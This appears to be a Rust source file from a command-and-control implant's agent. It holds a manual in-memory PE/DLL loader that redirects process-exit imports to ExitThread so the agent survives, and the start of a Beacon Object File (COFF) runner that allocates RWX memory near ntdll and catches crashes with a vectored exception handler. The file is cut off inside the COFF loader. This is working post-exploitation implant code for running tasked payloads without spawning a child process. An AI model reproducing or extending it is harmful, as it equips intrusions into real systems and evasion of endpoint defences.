// src/agent/inmem.rs
//
// In-memory code execution primitives:
//   1. PE Loader - manually map a PE/DLL into the current process and call its entry point
//   2. BOF Runner - parse a COFF object, resolve relocations, execute a target function
//   3. .NET Host - load the CLR and execute a .NET assembly via COM interop
//
// All three run inside the agent process; no child process is spawned.


// ────────────────────────────────────────────────────────────────────────
// 1. PE LOADER (Windows only)
// ────────────────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
pub mod pe_loader {
    use super::*;
    use std::ffi::c_void;
    use std::ptr;
    use std::mem;

    // Minimal PE structure definitions (only what we need for manual mapping)
    #[repr(C)]
    struct ImageDosHeader { e_magic: u16, _pad: [u8; 58], e_lfanew: i32 }

    #[repr(C)]
    struct ImageNtHeaders64 {
        signature: u32,
        file_header: ImageFileHeader,
        optional_header: ImageOptionalHeader64,
    }

    #[repr(C)]
    struct ImageFileHeader {
        machine: u16,
        number_of_sections: u16,
        _time_date_stamp: u32,
        _pointer_to_symbol_table: u32,
        _number_of_symbols: u32,
        size_of_optional_header: u16,
        characteristics: u16,
    }

    #[repr(C)]
    struct ImageOptionalHeader64 {
        magic: u16,
        _pad1: [u8; 14],
        address_of_entry_point: u32,
        _pad2: [u8; 8],
        image_base: u64,
        section_alignment: u32,
        file_alignment: u32,
        _pad3: [u8; 16],
        size_of_image: u32,
        size_of_headers: u32,
        _pad4: [u8; 4],
        _subsystem: u16,
        _dll_characteristics: u16,
        _pad5: [u8; 40],
        number_of_rva_and_sizes: u32,
    }

    #[repr(C)]
    struct ImageSectionHeader {
        name: [u8; 8],
        virtual_size: u32,
        virtual_address: u32,
        size_of_raw_data: u32,
        pointer_to_raw_data: u32,
        _pad: [u8; 12],
        characteristics: u32,
    }

    #[repr(C)]
    struct ImageDataDirectory { virtual_address: u32, size: u32 }

    #[repr(C)]
    struct ImageBaseRelocation { virtual_address: u32, size_of_block: u32 }

    #[repr(C)]
    struct ImageImportDescriptor {
        original_first_thunk: u32,
        _time_date_stamp: u32,
        _forwarder_chain: u32,
        name: u32,
        first_thunk: u32,
    }

    // WinAPI imports
    extern "system" {
        fn VirtualAlloc(addr: *mut c_void, size: usize, alloc_type: u32, protect: u32) -> *mut c_void;
        fn VirtualProtect(addr: *mut c_void, size: usize, new_protect: u32, old_protect: *mut u32) -> i32;
        fn VirtualFree(addr: *mut c_void, size: usize, free_type: u32) -> i32;
        fn LoadLibraryA(name: *const i8) -> *mut c_void;
        fn GetProcAddress(module: *mut c_void, name: *const i8) -> *mut c_void;
        fn FlushInstructionCache(process: *mut c_void, addr: *const c_void, size: usize) -> i32;
        fn GetCurrentProcess() -> *mut c_void;
    }

    const MEM_COMMIT: u32 = 0x1000;
    const MEM_RESERVE: u32 = 0x2000;
    const MEM_RELEASE: u32 = 0x8000;
    const PAGE_READWRITE: u32 = 0x04;
    const PAGE_EXECUTE_READ: u32 = 0x20;
    const PAGE_EXECUTE_READWRITE: u32 = 0x40;
    const IMAGE_DIRECTORY_ENTRY_BASERELOC: usize = 5;
    const IMAGE_DIRECTORY_ENTRY_IMPORT: usize = 1;

    /// Returns `true` when `[offset, offset + len)` lies fully inside `limit`.
    ///
    /// Every offset/RVA below comes from tasking-supplied PE bytes and must be
    /// validated against the source buffer (`pe_bytes.len()`) for reads from
    /// the file, and against `image_size` for reads/writes in the mapped image.
    /// All arithmetic is checked so a hostile value can't wrap the comparison.
    #[inline]
    fn range_ok(offset: usize, len: usize, limit: usize) -> bool {
        offset.checked_add(len).map_or(false, |end| end <= limit)
    }

    /// Bounded C-string read from the mapped image. Scans for the NUL
    /// terminator within `image_size` so a malformed RVA can't send
    /// `CStr::from_ptr` on an unbounded out-of-bounds scan.
    unsafe fn cstr_in_image<'a>(
        base: *const u8,
        image_size: usize,
        rva: usize,
    ) -> Option<&'a std::ffi::CStr> {
        if rva >= image_size {
            return None;
        }
        let bytes = std::slice::from_raw_parts(base.add(rva), image_size - rva);
        let nul = bytes.iter().position(|&b| b == 0)?;
        Some(std::ffi::CStr::from_bytes_with_nul_unchecked(&bytes[..=nul]))
    }

    /// Manually map a PE (EXE or DLL) into memory and call its entry point.
    /// For DLLs this calls DllMain(DLL_PROCESS_ATTACH). For EXEs it calls
    /// the entry point on a new thread and returns immediately.
    ///
    /// Returns Ok(base_address) on success.
    pub unsafe fn load_pe(pe_bytes: &[u8]) -> Result<String, String> {
        if pe_bytes.len() < mem::size_of::<ImageDosHeader>() {
            return Err("PE too small".into());
        }

        let dos = &*(pe_bytes.as_ptr() as *const ImageDosHeader);
        if dos.e_magic != 0x5A4D { return Err("Invalid DOS signature".into()); }

        // e_lfanew is a signed i32: a negative value sign-extends to a huge
        // usize, the old `nt_offset + size > len` check wrapped around, and the
        // NT-header deref went out of bounds. Reject negatives outright and do
        // the end-of-header computation with checked arithmetic.
        if dos.e_lfanew < 0 { return Err("Invalid NT header offset (negative e_lfanew)".into()); }
        let nt_offset = dos.e_lfanew as usize;
        if !range_ok(nt_offset, mem::size_of::<ImageNtHeaders64>(), pe_bytes.len()) {
            return Err("Invalid NT header offset".into());
        }
        let nt = &*(pe_bytes.as_ptr().add(nt_offset) as *const ImageNtHeaders64);
        if nt.signature != 0x00004550 { return Err("Invalid PE signature".into()); }
        if nt.optional_header.magic != 0x20B { return Err("Only PE32+ (x64) supported".into()); }

        let image_size = nt.optional_header.size_of_image as usize;
        let header_size = nt.optional_header.size_of_headers as usize;
        let preferred_base = nt.optional_header.image_base;

        // The headers are part of the image, so a PE whose SizeOfHeaders exceeds
        // SizeOfImage is malformed - the header copy would otherwise write past
        // the VirtualAlloc'd region.
        if image_size == 0 || header_size > image_size {
            return Err("Invalid SizeOfImage/SizeOfHeaders".into());
        }

        // Section headers live right after the optional header. Validate the
        // ENTIRE table against the file size once, up front, so every
        // per-section read below (the copy loop AND the protection loop) is
        // guaranteed in bounds. Uses checked arithmetic throughout.
        let section_count = nt.file_header.number_of_sections as usize;
        let sections_offset = nt_offset
            .checked_add(4 + mem::size_of::<ImageFileHeader>() + nt.file_header.size_of_optional_header as usize)
            .ok_or_else(|| "Invalid section table offset".to_string())?;
        // number_of_sections is a u16, so the multiply cannot overflow usize.
        if !range_ok(sections_offset, section_count * mem::size_of::<ImageSectionHeader>(), pe_bytes.len()) {
            return Err("Section table outside of PE buffer".into());
        }

        // 1. Allocate memory for the image
        let base = VirtualAlloc(
            preferred_base as *mut c_void,
            image_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        let base = if base.is_null() {
            // Preferred base unavailable; let OS choose
            VirtualAlloc(ptr::null_mut(), image_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
        } else { base };

        if base.is_null() { return Err("VirtualAlloc failed".into()); }

        // 2. Copy headers - capped by BOTH the file size and the allocated
        // image size (SizeOfHeaders > SizeOfImage is rejected above; the clamp
        // stays as defense-in-depth).
        ptr::copy_nonoverlapping(
            pe_bytes.as_ptr(),
            base as *mut u8,
            header_size.min(pe_bytes.len()).min(image_size),
        );

        // 3. Copy sections (section-table reads are in bounds - validated above)
        for i in 0..section_count {
            let sec = &*(pe_bytes.as_ptr().add(sections_offset + i * mem::size_of::<ImageSectionHeader>()) as *const ImageSectionHeader);
            if sec.size_of_raw_data == 0 { continue; }
            let src_offset = sec.pointer_to_raw_data as usize;
            let dst_offset = sec.virtual_address as usize;
            let copy_size = (sec.size_of_raw_data as usize).min(pe_bytes.len().saturating_sub(src_offset));
            // Validate BOTH source and destination bounds to prevent heap overflow
            // from malformed PE sections specifying out-of-range virtual addresses
            if src_offset + copy_size <= pe_bytes.len()
                && range_ok(dst_offset, copy_size, image_size)
            {
                ptr::copy_nonoverlapping(
                    pe_bytes.as_ptr().add(src_offset),
                    (base as *mut u8).add(dst_offset),
                    copy_size,
                );
            }
        }

        // 4. Process base relocations
        let delta = (base as u64).wrapping_sub(preferred_base) as i64;
        if delta != 0
            && nt.optional_header.number_of_rva_and_sizes > IMAGE_DIRECTORY_ENTRY_BASERELOC as u32
        {
            let data_dir_offset = nt_offset
                + 4 + mem::size_of::<ImageFileHeader>()
                + 112; // offset to DataDirectory in OptionalHeader64

            // Bounds check: verify the data directory entry for relocations
            // is within the PE buffer. Malformed/compacted PEs with a smaller
            // optional header would cause OOB reads without this.
            let reloc_entry_offset = data_dir_offset + IMAGE_DIRECTORY_ENTRY_BASERELOC * 8;
            if range_ok(reloc_entry_offset, 8, pe_bytes.len()) {
                let reloc_dir = &*(pe_bytes.as_ptr().add(reloc_entry_offset) as *const ImageDataDirectory);

                if reloc_dir.virtual_address != 0 && reloc_dir.size != 0 {
                    let reloc_rva = reloc_dir.virtual_address as usize;
                    let reloc_size = reloc_dir.size as usize;
                    let mut offset = 0usize;

                    while offset < reloc_size {
                        // reloc_rva/reloc_size are u32-sized, so this sum cannot
                        // overflow usize; every access below is checked against
                        // image_size before touching the mapped image.
                        let block_rva = reloc_rva + offset;

                        // Block header (8 bytes) must be readable from the image.
                        if !range_ok(block_rva, mem::size_of::<ImageBaseRelocation>(), image_size) {
                            VirtualFree(base, 0, MEM_RELEASE);
                            return Err("Relocation block outside mapped image".into());
                        }
                        let block = &*((base as *const u8).add(block_rva) as *const ImageBaseRelocation);
                        if block.size_of_block == 0 { break; }
                        let block_size = block.size_of_block as usize;

                        // size_of_block < 8 would underflow `(block_size - 8) / 2`
                        // into a huge entry count (OOB read/write). The whole
                        // block must also fit inside the mapped image.
                        if block_size < 8 || !range_ok(block_rva, block_size, image_size) {
                            VirtualFree(base, 0, MEM_RELEASE);
                            return Err("Malformed relocation block size".into());
                        }

                        let entry_count = (block_size - 8) / 2;
                        // Entries occupy [block_rva + 8, block_rva + 8 + entry_count*2),
                        // which is inside [block_rva, block_rva + block_size) -
                        // already validated against image_size above.
                        let entries = std::slice::from_raw_parts(
                            (base as *const u8).add(block_rva + 8) as *const u16,
                            entry_count,
                        );
                        for &entry in entries {
                            let reloc_type = entry >> 12;
                            let reloc_offset = (entry & 0x0FFF) as u32;
                            if reloc_type == 10 { // IMAGE_REL_BASED_DIR64
                                let patch_rva = block.virtual_address as usize + reloc_offset as usize;
                                // The patched u64 must lie fully within the image;
                                // the old code wrote through this pointer unchecked.
                                if !range_ok(patch_rva, 8, image_size) {
                                    VirtualFree(base, 0, MEM_RELEASE);
                                    return Err("Relocation target outside mapped image".into());
                                }
                                let patch_addr = (base as *mut u8).add(patch_rva) as *mut u64;
                                *patch_addr = (*patch_addr as i64 + delta) as u64;
                            }
                        }
                        // block_size >= 8 (checked above) so the walk always advances.
                        offset += block_size;
                    }
                }
            }
        }

        // 5. Resolve imports
        if nt.optional_header.number_of_rva_and_sizes > IMAGE_DIRECTORY_ENTRY_IMPORT as u32 {
            let data_dir_offset = nt_offset + 4 + mem::size_of::<ImageFileHeader>() + 112;
            let import_entry_offset = data_dir_offset + IMAGE_DIRECTORY_ENTRY_IMPORT * 8;
            // Bounds check: verify the import data directory entry is within the PE buffer.
            if range_ok(import_entry_offset, 8, pe_bytes.len()) {
                let import_dir = &*(pe_bytes.as_ptr().add(import_entry_offset) as *const ImageDataDirectory);

                if import_dir.virtual_address != 0 {
                    let import_rva = import_dir.virtual_address as usize;
                    let mut desc_offset = 0usize;
                    loop {
                        // The descriptor walk previously had NO bounds check -
                        // every descriptor read is now validated against the
                        // mapped image before it happens.
                        let desc_rva = import_rva + desc_offset;
                        if !range_ok(desc_rva, mem::size_of::<ImageImportDescriptor>(), image_size) {
                            VirtualFree(base, 0, MEM_RELEASE);
                            return Err("Import descriptor outside mapped image".into());
                        }
                        let desc = &*((base as *const u8).add(desc_rva) as *const ImageImportDescriptor);
                        if desc.name == 0 { break; }

                        let dll_name = match cstr_in_image(base as *const u8, image_size, desc.name as usize) {
                            Some(s) => s,
                            None => {
                                VirtualFree(base, 0, MEM_RELEASE);
                                return Err("Import DLL name outside mapped image".into());
                            }
                        };
                        let h_module = LoadLibraryA(dll_name.as_ptr());
                        if h_module.is_null() {
                            let name_str = dll_name.to_string_lossy();
                            VirtualFree(base, 0, MEM_RELEASE);
                            return Err(format!("Failed to load dependency: {}", name_str));
                        }

                        let mut thunk_offset = 0usize;
                        let olt_rva = (if desc.original_first_thunk != 0 { desc.original_first_thunk } else { desc.first_thunk }) as usize;
                        loop {
                            // Each 8-byte thunk read is bounds-checked against
                            // the mapped image (previously unchecked).
                            let olt_entry_rva = olt_rva + thunk_offset;
                            if !range_ok(olt_entry_rva, 8, image_size) {
                                VirtualFree(base, 0, MEM_RELEASE);
                                return Err("Import thunk outside mapped image".into());
                            }
                            let olt_entry = *((base as *const u8).add(olt_entry_rva) as *const u64);
                            if olt_entry == 0 { break; }

                            let func_addr = if olt_entry & (1u64 << 63) != 0 {
                                // Import by ordinal
                                let ordinal = (olt_entry & 0xFFFF) as u16;
                                GetProcAddress(h_module, ordinal as usize as *const i8)
                            } else {
                                // Import by name (skip 2-byte hint) - bounded C-string
                                // read so a hostile RVA can't scan out of bounds.
                                let name_rva = match (olt_entry as usize).checked_add(2) {
                                    Some(r) => r,
                                    None => {
                                        VirtualFree(base, 0, MEM_RELEASE);
                                        return Err("Import name RVA overflow".into());
                                    }
                                };
                                let func_name = match cstr_in_image(base as *const u8, image_size, name_rva) {
                                    Some(s) => s,
                                    None => {
                                        VirtualFree(base, 0, MEM_RELEASE);
                                        return Err("Import name outside mapped image".into());
                                    }
                                };
                                let resolved = GetProcAddress(h_module, func_name.as_ptr());

                                // OPSEC: Redirect process-terminating functions -> ExitThread
                                // so EXEs running in the loader thread don't kill the agent.
                                //
                                // ExitProcess (kernel32) is the obvious one, but MSVC/UCRT
                                // programs compiled with the C runtime usually exit via
                                // exit(), _exit(), _cexit(), _c_exit(), or abort() from
                                // msvcrt.dll / ucrtbase.dll. These call ExitProcess internally,
                                // but the IAT hook on ExitProcess only catches calls through
                                // the loaded PE's own import table - not calls from within
                                // the CRT DLL. We must hook the CRT functions themselves.
                                let fname_bytes = func_name.to_bytes();
                                let is_exit_func = fname_bytes == b"ExitProcess"
                                    || fname_bytes == b"exit"
                                    || fname_bytes == b"_exit"
                                    || fname_bytes == b"_cexit"
                                    || fname_bytes == b"_c_exit"
                                    || fname_bytes == b"abort";

                                if is_exit_func {
                                    let k32 = LoadLibraryA(b"kernel32.dll\0".as_ptr() as *const i8);
                                    let exit_thread = GetProcAddress(k32, b"ExitThread\0".as_ptr() as *const i8);
                                    if !exit_thread.is_null() { exit_thread } else { resolved }
                                } else {
                                    resolved
                                }
                            };

                            // Guard: if GetProcAddress returned NULL, the function doesn't
                            // exist in this DLL version. Writing NULL to the IAT would cause
                            // a null-pointer dereference crash when the PE calls that API.
                            if func_addr.is_null() {
                                let name_info = if olt_entry & (1u64 << 63) != 0 {
                                    format!("ordinal {}", olt_entry & 0xFFFF)
                                } else {
                                    match (olt_entry as usize).checked_add(2) {
                                        Some(r) => match cstr_in_image(base as *const u8, image_size, r) {
                                            Some(s) => s.to_string_lossy().into_owned(),
                                            None => "<invalid name RVA>".to_string(),
                                        },
                                        None => "<invalid name RVA>".to_string(),
                                    }
                                };
                                let dll_str = dll_name.to_string_lossy();
                                VirtualFree(base, 0, MEM_RELEASE);
                                return Err(format!("Import resolution failed: {}!{}", dll_str, name_info));
                            }

                            // Patch the IAT - the write target is validated
                            // against image_size first (previously unchecked).
                            let iat_rva = desc.first_thunk as usize + thunk_offset;
                            if !range_ok(iat_rva, 8, image_size) {
                                VirtualFree(base, 0, MEM_RELEASE);
                                return Err("IAT entry outside mapped image".into());
                            }
                            let iat_slot = (base as *mut u8).add(iat_rva) as *mut u64;
                            *iat_slot = func_addr as u64;

                            thunk_offset += 8;
                        }

                        desc_offset += mem::size_of::<ImageImportDescriptor>();
                    }
                }
            }
        }

        // 6. Set section protections (table reads are in bounds - validated
        // above; each protection range is clamped to the mapped image so a
        // malformed section header can't make VirtualProtect touch memory
        // past the allocation).
        for i in 0..section_count {
            let sec = &*(pe_bytes.as_ptr().add(sections_offset + i * mem::size_of::<ImageSectionHeader>()) as *const ImageSectionHeader);
            let raw_protect_size = if sec.virtual_size > 0 { sec.virtual_size } else { sec.size_of_raw_data } as usize;
            if raw_protect_size == 0 { continue; }
            let va = sec.virtual_address as usize;
            if va >= image_size { continue; }
            let size = raw_protect_size.min(image_size - va);

            let is_exec = sec.characteristics & 0x20000000 != 0;  // IMAGE_SCN_MEM_EXECUTE
            let is_write = sec.characteristics & 0x80000000 != 0; // IMAGE_SCN_MEM_WRITE

            let protect = match (is_exec, is_write) {
                (true, true) => PAGE_EXECUTE_READWRITE,
                (true, false) => PAGE_EXECUTE_READ,
                (false, true) => PAGE_READWRITE,
                (false, false) => 0x02, // PAGE_READONLY
            };

            let mut old = 0u32;
            VirtualProtect(
                (base as *mut u8).add(va) as *mut c_void,
                size,
                protect,
                &mut old,
            );
        }

        FlushInstructionCache(GetCurrentProcess(), base, image_size);

        // 7. Call entry point
        let entry_rva = nt.optional_header.address_of_entry_point as usize;
        if entry_rva == 0 {
            return Ok(format!("PE mapped at 0x{:X} (no entry point)", base as usize));
        }
        // A hostile AddressOfEntryPoint would otherwise make us call memory
        // outside the mapped image.
        if entry_rva >= image_size {
            VirtualFree(base, 0, MEM_RELEASE);
            return Err("Entry point outside mapped image".into());
        }

        let is_dll = nt.file_header.characteristics & 0x2000 != 0; // IMAGE_FILE_DLL
        let entry_addr = (base as *const u8).add(entry_rva);

        if is_dll {
            // DllMain(hinstDLL, DLL_PROCESS_ATTACH, NULL)
            type DllMain = unsafe extern "system" fn(*mut c_void, u32, *mut c_void) -> i32;
            let dll_main: DllMain = mem::transmute(entry_addr);
            let result = dll_main(base, 1, ptr::null_mut());
            Ok(format!("DLL loaded at 0x{:X}, DllMain returned {}", base as usize, result))
        } else {
            // EXE: run entry on a new thread.
            // Process-terminating functions (ExitProcess, exit, _exit, abort, etc.)
            // are redirected to ExitThread in the IAT above so the loaded EXE only
            // terminates its own thread rather than the entire agent process.
            let base_copy = base as usize;
            let entry_copy = entry_addr as usize;
            let image_size = nt.optional_header.size_of_image as usize;

            // Spawn the EXE runner, then a cleanup thread that waits for it to
            // finish and frees the mapped image. Without this, every in-memory EXE
            // permanently leaks its VirtualAlloc'd image, eventually OOM'ing the agent.
            let exe_thread = std::thread::spawn(move || {
                type EntryPoint = unsafe extern "system" fn() -> u32;
                let ep: EntryPoint = mem::transmute(entry_copy);
                ep();
            });

            std::thread::spawn(move || {
                // join() returns Err if the thread panicked or was killed (ExitThread),
                // but in both cases the thread has terminated and its memory is safe to free.
                let _ = exe_thread.join();
                extern "system" {
                    fn VirtualFree(addr: *mut c_void, size: usize, free_type: u32) -> i32;
                }
                const MEM_RELEASE: u32 = 0x8000;
                unsafe {
                    VirtualFree(base_copy as *mut c_void, 0, MEM_RELEASE);
                }
            });

            Ok(format!("EXE mapped at 0x{:X} ({}KB), entry thread spawned", base_copy, image_size / 1024))
        }
    }
}

// Stub for non-Windows
#[cfg(not(target_os = "windows"))]
pub mod pe_loader {
    pub unsafe fn load_pe(_pe_bytes: &[u8]) -> Result<String, String> {
        Err("PE loading is Windows-only".into())
    }
}

// ────────────────────────────────────────────────────────────────────────
// 2. BOF RUNNER (Beacon Object File - COFF loader)
// ────────────────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
pub mod bof {
    use std::ffi::c_void;
    use std::ptr;
    use std::mem;
    use std::collections::{HashMap, HashSet};
    use std::sync::{Mutex, OnceLock};

    extern "system" {
        fn VirtualAlloc(addr: *mut c_void, size: usize, alloc_type: u32, protect: u32) -> *mut c_void;
        fn VirtualFree(addr: *mut c_void, size: usize, free_type: u32) -> i32;
        fn LoadLibraryA(name: *const i8) -> *mut c_void;
        fn GetProcAddress(module: *mut c_void, name: *const i8) -> *mut c_void;
        fn GetModuleHandleA(name: *const i8) -> *mut c_void;
        fn FlushInstructionCache(process: *mut c_void, addr: *const c_void, size: usize) -> i32;
        fn GetCurrentProcess() -> *mut c_void;
        fn GetCurrentThreadId() -> u32;
        fn ExitThread(code: u32) -> !;
        fn AddVectoredExceptionHandler(first: u32, handler: unsafe extern "system" fn(*mut EXCEPTION_POINTERS) -> i32) -> *mut c_void;
        fn RemoveVectoredExceptionHandler(handle: *mut c_void) -> u32;
    }

    // ── VEH types for BOF crash containment ───────────────────────────
    #[repr(C)]
    struct EXCEPTION_RECORD { exception_code: u32, _rest: [u8; 148] }
    #[repr(C)]
    struct EXCEPTION_POINTERS { exception_record: *mut EXCEPTION_RECORD, _context: *mut c_void }

    const EXCEPTION_ACCESS_VIOLATION: u32 = 0xC0000005;
    const EXCEPTION_INT_DIVIDE_BY_ZERO: u32 = 0xC0000094;
    const EXCEPTION_STACK_OVERFLOW: u32 = 0xC00000FD;
    const EXCEPTION_ILLEGAL_INSTRUCTION: u32 = 0xC000001D;
    const EXCEPTION_PRIV_INSTRUCTION: u32 = 0xC0000096;
    const EXCEPTION_IN_PAGE_ERROR: u32 = 0xC0000006;
    const EXCEPTION_DATATYPE_MISALIGNMENT: u32 = 0x80000002;
    const EXCEPTION_CONTINUE_SEARCH: i32 = 0;

    /// Process-wide set of thread IDs currently executing BOFs.
    /// The VEH handler checks this to avoid interfering with non-BOF threads.
    fn bof_thread_ids() -> &'static Mutex<HashSet<u32>> {
        static IDS: OnceLock<Mutex<HashSet<u32>>> = OnceLock::new();
        IDS.get_or_init(|| Mutex::new(HashSet::new()))
    }

    /// VEH handler: catches hardware exceptions ONLY on registered BOF threads,
    /// terminates just that thread via ExitThread so the agent survives.
    ///
    /// IMPORTANT: std::panic::catch_unwind does NOT catch hardware exceptions
    /// (segfaults, access violations, illegal instructions). It only catches
    /// Rust-level panics. This VEH is the mechanism that actually contains
    /// hardware faults from native C/C++ BOF code.
    unsafe extern "system" fn bof_veh_handler(info: *mut EXCEPTION_POINTERS) -> i32 {
        let tid = GetCurrentThreadId();
        let is_bof = bof_thread_ids()
            .lock()
            .map(|set| set.contains(&tid))
            .unwrap_or(false);
        if !is_bof {
            return EXCEPTION_CONTINUE_SEARCH;
        }
        let code = (*(*info).exception_record).exception_code;
        // Catch all hardware exception types that BOFs can trigger.
        // The original code only caught 3, letting illegal instructions
        // and other faults crash the entire agent process.
        if code == EXCEPTION_ACCESS_VIOLATION
            || code == EXCEPTION_INT_DIVIDE_BY_ZERO
            || code == EXCEPTION_STACK_OVERFLOW
            || code == EXCEPTION_ILLEGAL_INSTRUCTION
            || code == EXCEPTION_PRIV_INSTRUCTION
            || code == EXCEPTION_IN_PAGE_ERROR
            || code == EXCEPTION_DATATYPE_MISALIGNMENT
        {
            if let Ok(mut set) = bof_thread_ids().lock() {
                set.remove(&tid);
            }
            ExitThread(code);
        }
        EXCEPTION_CONTINUE_SEARCH
    }

    const MEM_COMMIT: u32 = 0x1000;
    const MEM_RESERVE: u32 = 0x2000;
    const MEM_RELEASE: u32 = 0x8000;
    const PAGE_EXECUTE_READWRITE: u32 = 0x40;

    // Minimal COFF header structures
    #[repr(C, packed)]
    #[derive(Copy, Clone)]
    struct CoffHeader {
        machine: u16,
        number_of_sections: u16,
        time_date_stamp: u32,
        pointer_to_symbol_table: u32,
        number_of_symbols: u32,
        size_of_optional_header: u16,
        characteristics: u16,
    }

    #[repr(C, packed)]
    #[derive(Copy, Clone)]
    struct CoffSection {
        name: [u8; 8],
        virtual_size: u32,
        virtual_address: u32,
        size_of_raw_data: u32,
        pointer_to_raw_data: u32,
        pointer_to_relocations: u32,
        _pointer_to_linenumbers: u32,
        number_of_relocations: u16,
        _number_of_linenumbers: u16,
        characteristics: u32,
    }

    #[repr(C, packed)]
    #[derive(Copy, Clone)]
    struct CoffReloc {
        virtual_address: u32,
        symbol_table_index: u32,
        reloc_type: u16,
    }

    #[repr(C, packed)]
    #[derive(Copy, Clone)]
    struct CoffSymbol {
        name: [u8; 8],
        value: u32,
        section_number: i16,
        sym_type: u16,
        storage_class: u8,
        number_of_aux_symbols: u8,
    }

    const IMAGE_REL_AMD64_ADDR64: u16 = 1;
    const IMAGE_REL_AMD64_ADDR32NB: u16 = 3;
    const IMAGE_REL_AMD64_REL32: u16 = 4;

    /// Load and execute a BOF (COFF object file).
    ///
    /// The BOF must export a function named `go` with signature:
    ///   `void go(char* args, int args_len)`
    ///
    /// `args_data` is passed verbatim to the `go` function.
    pub unsafe fn run_bof(coff_bytes: &[u8], args_data: &[u8]) -> Result<String, String> {
        if coff_bytes.len() < mem::size_of::<CoffHeader>() {
            return Err("COFF too small".into());
        }

        let header = *(coff_bytes.as_ptr() as *const CoffHeader);
        if header.machine != 0x8664 { return Err("Only x64 COFF supported".into()); }

        let num_sections = header.number_of_sections as usize;
        let sections_offset = mem::size_of::<CoffHeader>() + header.size_of_optional_header as usize;

        // ── Up-front bounds validation ──────────────────────────────────
        // Every offset in a COFF comes from tasking-supplied bytes. Validate
        // all table extents against coff_bytes.len() BEFORE allocating, so a
        // malformed object can't drive out-of-bounds table reads (the old code
        // read the section/symbol/relocation tables completely unchecked).

        // Section table: [sections_offset, sections_offset + num_sections * 40)
        let sec_table_bytes = num_sections
            .checked_mul(mem::size_of::<CoffSection>())
            .ok_or_else(|| "COFF section table size overflow".to_string())?;
        if sections_offset.checked_add(sec_table_bytes).map_or(true, |end| end > coff_bytes.len()) {
            return Err("COFF section table out of bounds".into());
        }

        // Symbol table: [sym_table_offset, string_table_offset), 18 bytes/symbol.
        // The string table begins immediately after the symbol table.
        let sym_table_offset = header.pointer_to_symbol_table as usize;
        let num_symbols = header.number_of_symbols as usize;
        let sym_table_bytes = num_symbols
            .checked_mul(18) // 18 bytes per symbol
            .ok_or_else(|| "COFF symbol table size overflow".to_string())?;
        let string_table_offset = sym_table_offset
            .checked_add(sym_table_bytes)
            .ok_or_else(|| "COFF symbol table offset overflow".to_string())?;
        if string_table_offset > coff_bytes.len() {
            return Err("COFF symbol table out of bounds".into());
        }

        // Per-section relocation tables (reads validated once, up front).
        for i in 0..num_sections {
            let sec = *(coff_bytes.as_ptr().add(sections_offset + i * mem::size_of::<CoffSection>()) as *const CoffSection);
            let num_relocs = sec.number_of_relocations as usize;
            if num_relocs == 0 { continue; }
            let reloc_bytes = num_relocs
                .checked_mul(mem::size_of::<CoffReloc>())
                .ok_or_else(|| "COFF relocation table size overflow".to_string())?;
            let reloc_end = (sec.pointer_to_relocations as usize)
                .checked_add(reloc_bytes)
                .ok_or_else(|| "COFF relocation table offset overflow".to_string())?;
            if reloc_end > coff_bytes.len() {
                return Err("COFF relocation table out of bounds".into());
            }
        }

        // Per-section in-memory footprint. This MUST be identical in the
        // sizing pass and the copy/relocation passes: the old code summed
        // `(raw > 0) ? raw : virtual` here but advanced the copy pass by
        // `max(raw, virtual)` - sections with virtual_size > size_of_raw_data > 0
        // made the copy and relocation writes run past the allocation.
        let section_footprint = |sec: &CoffSection| -> usize {
            let span = (sec.size_of_raw_data as usize).max(sec.virtual_size as usize);
            (span + 0xFFF) & !0xFFF // page-align
        };

        // First pass: compute total allocation size.
        // (num_sections <= u16::MAX and each footprint < 2^33, so the sum
        // cannot overflow usize on 64-bit.)
        let mut total_size = 0usize;
        for i in 0..num_sections {
            let sec = *(coff_bytes.as_ptr().add(sections_offset + i * mem::size_of::<CoffSection>()) as *const CoffSection);
            total_size += section_footprint(&sec);
        }

        // Allocate one big RWX block for simplicity.
        // Extra page at the end serves as a trampoline table for REL32 relocations
        // where the target is >2GB away (i32 overflow).
        const TRAMPOLINE_SIZE: usize = 14; // mov rax, imm64 (10) + jmp rax (2) + padding (2)
        const MAX_TRAMPOLINES: usize = 256;
        let trampoline_area = (MAX_TRAMPOLINES * TRAMPOLINE_SIZE + 0xFFF) & !0xFFF;
        let alloc_size = total_size + trampoline_area;

        // Try to allocate near ntdll (where most BOF imports live) to keep
        // REL32 relocations within ±2GB and minimize expensive trampoline usage.
        // If the preferred allocation fails, fall back to any address.
        let ntdll_base = GetModuleHandleA(b"ntdll.dll\0".as_ptr() as *const i8);
        let mut base = ptr::null_mut();
        if !ntdll_base.is_null() {
            // Scan downward from ntdll in 64KB increments (VirtualAlloc alignment)
            for offset in (1..=512).map(|i| i * 0x10000usize) {
                let try_addr = (ntdll_base as usize).saturating_sub(offset) as *mut c_void;
                let result = VirtualAlloc(try_addr, alloc_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                if !result.is_null() {
                    base = result;
                    break;
                }
            }
        }
        // Fallback: let the OS pick any address
        if base.is_null() {
            base = VirtualAlloc(ptr::null_mut(), alloc_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        }
        if base.is_null() { return Err("VirtualAlloc failed for BOF".into()); }
        let mut trampoline_offset = total_size; // first trampoline starts right after sections

        let mut section_data: Vec<(*mut u8, usize)> = Vec::new();
        let mut current_offset = 0usize;
        for i in 0..num_sections {
            let sec = *(coff_bytes.as_ptr().add(sections_offset + i * mem::size_of::<CoffSection>()) as *const CoffSection);
            let raw_size = sec.size_of_raw_data as usize;
            let aligned = section_footprint(&sec);
            // current_offset is the sum of the same footprints that produced
            // total_size, and raw_size <= aligned, so this stays inside the
            // allocation.
            let sec_base = (base as *mut u8).add(current_offset);

            if raw_size > 0 {
                let src = sec.pointer_to_raw_data as usize;
                if src.checked_add(raw_size).map_or(false, |end| end <= coff_bytes.len()) {
                    ptr::copy_nonoverlapping(
                        coff_bytes.as_ptr().add(src),
                        sec_base,
                        raw_size,
                    );
                } else {
                    // Malformed section raw-data pointer: fail closed instead
                    // of silently running a half-mapped BOF.
                    VirtualFree(base, 0, MEM_RELEASE);
                    return Err("COFF section raw data out of bounds".into());
                }
            }

            section_data.push((sec_base, aligned));
            current_offset += aligned;
        }

        // Symbol/string-table offsets were validated up front.
        let get_symbol_name = |sym: &CoffSymbol| -> Option<String> {
